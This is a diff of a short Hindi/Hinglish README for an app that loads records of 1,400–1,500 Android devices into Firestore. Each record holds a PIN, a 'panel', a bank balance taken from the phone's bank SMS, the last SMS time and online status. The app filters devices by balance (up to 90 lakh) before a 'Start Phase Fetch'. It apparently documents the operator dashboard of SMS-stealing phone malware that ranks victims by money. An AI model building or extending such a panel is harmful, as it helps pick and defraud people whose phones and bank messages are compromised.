@@ -1,36 +1,40 @@
-# Device txt (Firebase) — Hindi
+# पूरी txt (1400–1500 devices) — APK upload
 
-## Line format
-
-```
-deviceId | PIN | naam | lastSMS | sortValue
-```
-
-| Part | Example |
-|------|---------|
-| deviceId | Android ID |
-| PIN | `4521` ya `open` / khali = bina PIN |
-| naam | optional |
-| lastSMS | `12/03/2026` ya epoch ms — SMS time |
-| sortValue | number — High↔Low isi se |
-
-Example:
+## Line format (| से)
 
 ```
-a1b2c3d4|open|Ram|10/11/2025|100
-x9y8z7|1234|Shyam|1731000000000|50
+deviceId|pin|name|panel|balance|lastSms|online
 ```
 
-## App filters
+| Column | Example |
+|--------|---------|
+| deviceId | Android / Firebase device id |
+| pin | `1234` या `open` (बिना PIN) |
+| name | optional |
+| panel | panel नाम — **Panels count** इसी से |
+| balance | `75000` या `3.5l` (लाख) — bank SMS balance |
+| lastSms | `09/11/2025` या epoch ms |
+| online | `1` / `0` या `online` / `offline` |
 
-- **High → Low / Low → High** — `sortValue` (nahi to last SMS time)
-- **With PIN / Without PIN**
-- **SMS:** 1, 3, 7, 15, 30 din (last SMS us window mein) · **All time**
+## Start Phase Fetch (filters)
 
-## Upload
+1. **Txt → Firestore** या **Fetch 1200+** — सारी devices memory में
+2. **Panels: X** dikhega
+3. Filters:
+   - **High→Low** — balance **50,000 – 90 lakh**
+   - **Low→High** — balance **2,000 – 50,000**
+   - **PIN:** Both / With / Without
+   - **SMS:** 1,3,7,15,30 din (bank SMS time)
+   - **Line:** Both / Online (ऊपर) / Offline
+4. **▶ Start Phase Fetch** — match होने वाली list
 
-1. Firebase config txt
-2. **Txt → Firestore** — 1200 devices import
-3. **Fetch 1200+ devices** — dobara load
+## Example
 
-Firestore rules: `devices` read/write (testing).
+```
+abc123|open|R1|Panel-A|125000|06/11/2025|1
+def456|4521|R2|Panel-A|15000|05/11/2025|0
+```
+
+## Firebase fields (अगर direct DB)
+
+`deviceId`, `pin`, `panel`, `balance`, `lastSmsAt`, `online`
